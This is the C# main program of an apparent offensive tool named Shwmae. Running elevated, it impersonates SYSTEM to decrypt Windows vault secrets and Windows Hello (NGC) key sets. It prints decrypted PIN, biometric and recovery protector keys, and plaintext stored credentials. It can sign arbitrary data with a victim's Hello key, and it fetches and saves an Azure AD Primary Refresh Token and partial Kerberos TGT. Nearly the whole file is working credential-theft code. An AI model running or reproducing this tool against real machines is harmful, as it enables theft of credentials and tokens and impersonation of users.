using System;
using DPAPI;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography.X509Certificates;
using System.Security.Cryptography;
using System.Text;
using Mono.Options;
using NtApiDotNet;
using Shwmae.Ngc.Keys;
using Shwmae.Ngc.Protectors;
using Shwmae.Ngc;
using Shwmae.Vault;
using System.Linq;

namespace Shwmae {
    internal class Program {

        enum Mode {
            Enum,
            Sign,
            PRT
        }

        static bool verbose = false;

        static void Enumerate(IEnumerable<NgcContainer> ngcContainers, IMasterKeyProvider machineKeyProvider, IMasterKeyProvider systemKeyProvider, IEnumerable<DecryptedCredential> decryptedVaultCreds,
            string pin, string accessToken) {

            NgcProtector ngcKeySet = null;
            byte[] recoveryPinAesKey = null;

            foreach (var ngcContainer in ngcContainers) {

                Console.WriteLine($"\n{ngcContainer.Sid.Name} ({ngcContainer.Sid})\n");
                Console.WriteLine($"  Provider              : {ngcContainer.Provider}");

                if (ngcContainer.RecoveryKey != null) {
                    Console.WriteLine($"  Protected Recovery Key: {(verbose ? ngcContainer.RecoveryKey : ngcContainer.RecoveryKey.Substring(0, 30) + "...")}");

                    if (accessToken != null) {

                        try {
                            recoveryPinAesKey = ngcContainer.DecryptRecoveryKey(accessToken, machineKeyProvider);
                            Console.WriteLine($"  Recovery Key          : {recoveryPinAesKey.Hex()}");
                        } catch (Exception e) {
                            Console.WriteLine($"  Recovery Key          : False {e.Message}");
                        }

                    } else {
                        Console.WriteLine($"  Recovery Key          : Use /token argument to decrypt recovery key");
                    }
                }

                Console.WriteLine();
                Console.WriteLine("  ** Protectors **");

                foreach (var protector in ngcContainer.Protectors) {
                    Console.WriteLine();
                    Console.WriteLine($"    Type           : {protector.ProtectorType}");

                    if (protector is PinProtector pinProtector) {
                        Console.WriteLine($"    Pin Type       : {pinProtector.PinType}");
                        Console.WriteLine($"    Length         : {(pinProtector.PinType == PinType.Numeric ? pinProtector.PinLength.ToString() : "Unknown")}");

                        if (pin != null) {
                            try {
                                protector.Decrypt(Encoding.Unicode.GetBytes(pin));
                                Console.WriteLine($"    Decrypted      : True (PIN Correct)");
                                Console.WriteLine($"    UnkPin         : {protector.External.Hex()}");
                                Console.WriteLine($"    DecryptPin     : {protector.DecryptPin.Hex()}");
                                Console.WriteLine($"    SignPin        : {protector.SignPin.Hex()}");
                                ngcKeySet = protector;
                            } catch (CryptographicException ce) {
                                Console.WriteLine($"    Decrypted      : {ce.Message}");
                            }
                        } else {
                            Console.WriteLine($"    Decrypted      : Supply /pin argument to attempt decryption");
                        }

                    } else if (protector is BioProtector bioProtector) {

                        Console.WriteLine($"    Encryption Type: {bioProtector.BioEncryptionType}");
                        if (bioProtector.BioEncryptionType == BioEncryptionType.Aes) {
                            Console.WriteLine($"    GCM Nonce      : {bioProtector.AesNonce.Hex()}");
                            Console.WriteLine($"    GCM AuthData   : {bioProtector.AesAuthData.Hex()}");
                            Console.WriteLine($"    GCM Tag        : {bioProtector.AesTag.Hex()}");

                            foreach (var bioKey in decryptedVaultCreds.Where(dc => dc is BioCredential && dc.Identity == bioProtector.User.Sid)) {
                                try {
                                    bioProtector.Decrypt(((BioCredential)bioKey).ProtectorKey);
                                    Console.WriteLine($"    Decrypted      : True (Bio Key Correct)");
                                    Console.WriteLine($"    UnkPin         : {bioProtector.External.Hex()}");
                                    Console.WriteLine($"    DecryptPin     : {bioProtector.DecryptPin.Hex()}");
                                    Console.WriteLine($"    SignPin        : {bioProtector.SignPin.Hex()}");
                                    ngcKeySet = protector;
                                } catch (CryptographicException ce) {
                                    Console.WriteLine($"    Decrypted      : False: ({ce.Message})");
                                }
                            }
                        }
                    } else if (protector is RecoveryProtector rp) {

                        Console.WriteLine($"    IV             : {rp.IV.Hex()}");

                        try {
                            if (recoveryPinAesKey != null) {
                                rp.Decrypt(recoveryPinAesKey);
                                Console.WriteLine($"    Decrypted      : True (Recovery Key Correct)");
                                Console.WriteLine($"    UnkPin         : {rp.External.Hex()}");
                                Console.WriteLine($"    DecryptPin     : {rp.DecryptPin.Hex()}");
                                Console.WriteLine($"    SignPin        : {rp.SignPin.Hex()}");
                            }
                        } catch (CryptographicException ce) {
                            Console.WriteLine($"    Decrypted      : False: {ce.Message}");
                        }
                    }
                }

                Console.WriteLine("\n  ** Keys **");

                foreach (var ngcKey in ngcContainer.Keys) {
                    Console.WriteLine();
                    Console.WriteLine($"    Name             : {ngcKey.Name}");
                    Console.WriteLine($"    Provider         : {ngcKey.Provider}");
                    Console.WriteLine($"    Key Id           : {ngcKey.KeyId}");
                    Console.WriteLine($"    Key Path         : {(ngcKey.KeyPath != null ? ngcKey.KeyPath : "(missing)")}");

                    if (ngcKey is NgcPassKey passKey) {
                        Console.WriteLine($"    FIDO Relay Party : {passKey.RpId}");
                        Console.WriteLine($"    FIDO Cred Id     : {passKey.CredentialId}");
                        Console.WriteLine($"    FIDO User Id     : {passKey.UserId}");
                        Console.WriteLine($"    FIDO User        : {passKey.Name}");
                        Console.WriteLine($"    FIDO Display Name: {passKey.DisplayName}");
                    } else if (ngcKey is AzureADKey aadKey) {
                        Console.WriteLine($"    Azure Tenant Id  : {aadKey.TenantId}");
                        Console.WriteLine($"    Azure User       : {aadKey.Email}");
                        Console.WriteLine($"    Azure kid        : {aadKey.AzureKid}");
                    }
                }

                Console.WriteLine("\n  ** Credentials **");

                var ngcVaultKey = ngcContainer.Keys.FirstOrDefault(k => k.Name == "//9DDC52DB-DC02-4A8C-B892-38DEF4FA748F");

                if (ngcVaultKey == null) {
                    Console.WriteLine("    No vault key available with ID //9DDC52DB-DC02-4A8C-B892-38DEF4FA748F");
                    continue;
                }

                foreach (var vaultKey in decryptedVaultCreds.Where(dc => dc.Identity == ngcContainer.Sid)) {

                    Console.WriteLine();
                    Console.WriteLine($"    Resource         : {vaultKey.Resource}");
                    Console.WriteLine($"    SID              : {vaultKey.Identity}");

                    if (vaultKey is NgcCredential ngcVaultCred) {
                        try {
                            if (ngcKeySet != null) {
                                var aesKey = ngcVaultKey.Decrypt(ngcVaultCred.EncData, new NgcPin(ngcKeySet.DecryptPin), systemKeyProvider);
                                var plaintextCred = Encoding.Unicode.GetString(Utils.AesDecrypt(ngcVaultCred.EncPassword, aesKey, ngcVaultCred.IV)).Replace("\0", "");
                                Console.WriteLine($"    Credential       : {plaintextCred}");
                            } else {
                                Console.WriteLine($"    Credential       : No NGC key set has been decrypted for this user, cannot decrypt vault credential");
                            }
                        } catch (CryptographicException) { }

                    } else if (vaultKey is BioCredential bioCred) {
                        Console.WriteLine($"    Protector Key    : {bioCred.ProtectorKey.Hex()}");
                    }
                }

            }
        }

        static NgcProtector GetFirstDecryptedProtector(NgcContainer container, string pin, IEnumerable<DecryptedCredential> decryptedVaultCreds) {

            foreach (var protector in container.Protectors) {

                if (protector is BioProtector bioProtector) {

                    if (bioProtector.BioEncryptionType == BioEncryptionType.Aes) {
                        foreach (var bioKey in decryptedVaultCreds.Where(dc => dc is BioCredential && dc.Identity == bioProtector.User.Sid)) {
                            try {
                                bioProtector.Decrypt(((BioCredential)bioKey).ProtectorKey);
                                return protector;
                            } catch (CryptographicException ce) {
                               
                            }
                        }
                    }

                } else if (protector is PinProtector pinProtector && pin != null) {
                    protector.Decrypt(Encoding.Unicode.GetBytes(pin));
                    return protector;
                }
            }

            return null;
        }

        static void Main(string[] args) {

            bool showHelp = false;
            string systemDPAPI;
            string pin = null;
            string accessToken = null;
            string sid = null;
            bool doPRT = false;
            Mode mode = Mode.Enum;
            string keyname = null;
            string data = null;

            OptionSet option_set = new OptionSet()
                        .Add("h|help", "Show this help", v => showHelp = true)
                        .Add("verbose", "Show verbose information", v => verbose = true)
                        .Add("system-dpapi=", "The system DPAPI key", v => systemDPAPI = v)
                        .Add("pin=", "The PIN/password user for the userVerification key protection", v => pin = v)
                        .Add("sid=", "Dump information for a specific SID", v => sid = v)
                        .Add("prt", "If Azure AD keys are found, request a PRT where possible", v => doPRT = true)
                        .Add("token=", "Azure AD access token for cred.microsoft.com resource", v => accessToken = v)
                        .Add<Mode>("mode=", "Select between Enum, Sign and PRT mode (Enum default)", v => mode = v)
                        .Add("keyname=", "Select the key id to perform an operation on", v => keyname = v)
                        .Add("data=", "Base64 encoded data to sign", v => data = v);

            option_set.Parse(args);

            if (showHelp) {
                option_set.WriteOptionDescriptions(Console.Out);
                return;
            }

            if ((pin != null || accessToken != null) && sid == null && mode == Mode.Enum) {
                Console.WriteLine("[!] When pin or token is used the sid argument is needed to target a specific user");
                return;
            }

            IMasterKeyProvider systemKeyProvider;
            IMasterKeyProvider machineKeyProvider;
            IEnumerable<DecryptedCredential> decryptedVaultCreds;
            RSACng deviceKey = null;
            X509Certificate2 deviceCert = null;

            if (!NtToken.EnableDebugPrivilege()) {
                Console.WriteLine("[!] Failed to enable debug privileges, are you elevated?");
                return;
            }

            using (var ctx = Utils.Impersonate("SYSTEM")) {

                systemKeyProvider = new MasterKeyProviderSystemUser();
                machineKeyProvider = new MasterKeyProviderLocalMachine();

                var vaultPolicy = new Policy(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), @"config\systemprofile\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28\Policy.vpol"));
                var masterKey = systemKeyProvider.GetMasterKey(vaultPolicy.PolicyKey.GuidMasterKey);
                Console.WriteLine($"[+] Decrypted SYSTEM vault policy {vaultPolicy.VaultId} key: {masterKey.Key.Hex()}");
                vaultPolicy.Decrypt(masterKey);
                Console.WriteLine($"[+] Decrypted vault policy: ");
                Console.WriteLine($"  Aes128: {vaultPolicy.Aes128Key.Hex()}");
                Console.WriteLine($"  Aes256: {vaultPolicy.Aes256Key.Hex()}");

                decryptedVaultCreds = Credential.GetCredentials(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), @"config\systemprofile\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28"))
                   .Select(cred => cred.Decrypt(vaultPolicy))
                   .ToArray();

                deviceCert = AzureADKey.FindDeviceCert();
                if (deviceCert != null)
                    deviceKey = deviceCert.GetRSAPrivateKey() as RSACng;
            }

            using (var ctx = Utils.Impersonate("Ngc")) {

                var ngcContainers = NgcContainer.GetAll();

                if (sid != null) {
                    ngcContainers = ngcContainers.Where(c => c.Sid == Sid.Parse(sid));
                }

                if (mode == Mode.Enum) {
                    Enumerate(ngcContainers, machineKeyProvider, systemKeyProvider, decryptedVaultCreds, pin, accessToken);
                } else if (mode == Mode.Sign) {

                    if (data == null || keyname == null) {
                        Console.WriteLine("[!] Both data and keyname args needed to sign data");
                        return;
                    }

                    var container = ngcContainers
                        .Where(ngcc => ngcc.Keys.Any(k => k.Name == keyname))
                        .FirstOrDefault();

                    if (container == default) {
                        Console.WriteLine($"[!] Could not find key with name {keyname} in any of the NGC containers");
                        return;
                    }

                    Console.WriteLine($"[=] Found key in container {container.Id} for user {container.Sid.Name} ({container.Sid})");

                    var protector = GetFirstDecryptedProtector(container, pin, decryptedVaultCreds);

                    if(protector == null) {
                        Console.WriteLine($"[!] Could not decrypt any of the protectors for account {container.Sid.Name}, provide pin argument to decrypt primary pin protector");
                        return;
                    }

                    Console.WriteLine($"[+] Successfully decrypted NGC key set from protector type {protector.ProtectorType}");

                    var key = container.Keys.First(k => k.Name == keyname);
                    byte[] signedData;

                    try {
                        signedData = key.Sign(Encoding.UTF8.GetBytes(data), new NgcPin(protector.SignPin), machineKeyProvider, HashAlgorithmName.SHA256);
                    }catch(CryptographicException) {
                        signedData = key.Sign(Encoding.UTF8.GetBytes(data), new NgcPin(protector.External), machineKeyProvider, HashAlgorithmName.SHA256);
                    }

                    Console.WriteLine($"[+] Success:\n{Convert.ToBase64String(signedData)}");
                
                }else if(mode == Mode.PRT) {

                    if(sid == null) {
                        Console.WriteLine("[!] sid argument needs to be supplied to fetch a PRT");
                        return;
                    }

                    var container = ngcContainers
                        .Where(ngcc => ngcc.Sid.ToString() == sid && ngcc.Keys.Any(k =>(k is AzureADKey)))
                        .FirstOrDefault();
                                                           
                    if (container == default) {
                        Console.WriteLine($"[!] Could not find Azure certificate for user with SID {sid}");
                        return;
                    }

                    var aadKey = (AzureADKey)container.Keys.First(k => k is AzureADKey);

                    Console.WriteLine($"[=] Found Azure key with UPN {aadKey.Email} and kid {aadKey.AzureKid}");

                    var protector = GetFirstDecryptedProtector(container, pin, decryptedVaultCreds);

                    if (protector == null) {
                        Console.WriteLine($"[!] Could not decrypt any of the protectors for account {container.Sid.Name}, provide pin argument to decrypt primary pin protector");
                        return;
                    }

                    Console.WriteLine($"[+] Successfully decrypted NGC key set from protector type {protector.ProtectorType}");
                    
                    ctx.Revert();
                    using (var systemCtx = Utils.Impersonate("SYSTEM")) {

                        aadKey.GetPRT(protector, systemKeyProvider, deviceKey, deviceCert);
                        Console.WriteLine($"    Transport Key    : {aadKey.TransportKeyName}");

                        if (aadKey.PRT != null) {
                            var prtFile = $"{aadKey.Email}-{aadKey.TenantId}.prt";
                            File.WriteAllText(prtFile, aadKey.PRT);
                            Console.WriteLine($"    Azure PRT Saved  : {prtFile}");
                        }

                        if (aadKey.PartialTGT != null) {
                            Console.WriteLine($"    Partial TGT      :\n {aadKey.PartialTGT}");
                        }
                    }                    
                }
            }
        }
    }
}
